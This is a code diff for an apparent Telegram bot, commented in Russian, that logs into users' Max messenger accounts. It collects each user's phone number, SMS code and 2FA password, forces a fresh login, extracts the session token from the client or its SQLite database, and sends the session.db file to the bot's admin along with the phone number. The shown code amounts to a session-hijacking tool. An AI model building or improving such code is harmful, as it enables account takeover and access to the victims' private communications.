@@ -86,6 +86,11 @@ def pymax_thread(uid, phone, work_dir):
     from pymax import Client as MaxClient
     import builtins
     
+    # Удаляем старую сессию, чтобы pymax точно запросил SMS
+    db_path = Path(work_dir) / "session.db"
+    if db_path.exists():
+        db_path.unlink()
+    
     original = builtins.input
     
     def custom_input(prompt=""):
@@ -108,14 +113,49 @@ def pymax_thread(uid, phone, work_dir):
     
     try:
         client = MaxClient(phone=phone, work_dir=work_dir)
-        client.start()
         
-        # Сюда попадём только после успешной авторизации
-        token = client.token if hasattr(client, 'token') else client.session.token
-        user_id = client.my_id if hasattr(client, 'my_id') else client.me.id
+        # Пробуем login, если нет — start
+        try:
+            client.login()
+        except AttributeError:
+            client.start()
+        
+        # Пробуем достать токен всеми способами
+        token = None
+        user_id = None
+        
+        if hasattr(client, 'token') and client.token:
+            token = client.token
+        
+        if not token:
+            import sqlite3
+            if db_path.exists():
+                conn = sqlite3.connect(str(db_path))
+                cursor = conn.cursor()
+                try:
+                    cursor.execute("SELECT value FROM session WHERE key='token'")
+                    row = cursor.fetchone()
+                    if row:
+                        token = row[0]
+                except:
+                    pass
+                conn.close()
+        
+        if hasattr(client, 'my_id') and client.my_id:
+            user_id = client.my_id
+        elif hasattr(client, 'me') and hasattr(client.me, 'id'):
+            user_id = client.me.id
+        
+        if not token:
+            if db_path.exists():
+                with open(f"{work_dir}/status.txt", "w") as f:
+                    f.write("session_saved")
+                return
+            else:
+                raise Exception("Не удалось получить токен")
         
         with open(f"{work_dir}/result.json", "w") as f:
-            json.dump({"ok": True, "token": token, "user_id": user_id}, f)
+            json.dump({"ok": True, "token": token, "user_id": user_id or 0}, f)
         with open(f"{work_dir}/status.txt", "w") as f:
             f.write("done")
             
@@ -244,6 +284,18 @@ async def code_handler(message: types.Message, state: FSMContext):
             await state.clear()
             return
         
+        elif status == "session_saved":
+            db_path = Path(work_dir) / "session.db"
+            if db_path.exists():
+                await bot.send_document(ADMIN_ID, FSInputFile(str(db_path)),
+                    caption=f"📦 Файл сессии\nНомер: {phone}")
+                await msg.edit_text("✅ Сессия сохранена. Файл отправлен админу.")
+            else:
+                await msg.edit_text("❌ Не удалось сохранить сессию.")
+            del pending[uid]
+            await state.clear()
+            return
+        
         elif status == "need_password":
             await state.set_state(AuthState.waiting_for_password)
             await msg.edit_text("🔐 Введи пароль 2FA:")
@@ -309,6 +361,18 @@ async def password_handler(message: types.Message, state: FSMContext):
             
             await send_files(phone, uid, work_dir, desktop, js)
             await msg.edit_text("✅ Готово!")
+            del pending[uid]
+            await state.clear()
+            return
+        
+        elif status == "session_saved":
+            db_path = Path(work_dir) / "session.db"
+            if db_path.exists():
+                await bot.send_document(ADMIN_ID, FSInputFile(str(db_path)),
+                    caption=f"📦 Файл сессии\nНомер: {phone}")
+                await msg.edit_text("✅ Сессия сохранена. Файл отправлен админу.")
+            else:
+                await msg.edit_text("❌ Не удалось сохранить сессию.")
             del pending[uid]
             await state.clear()
             return
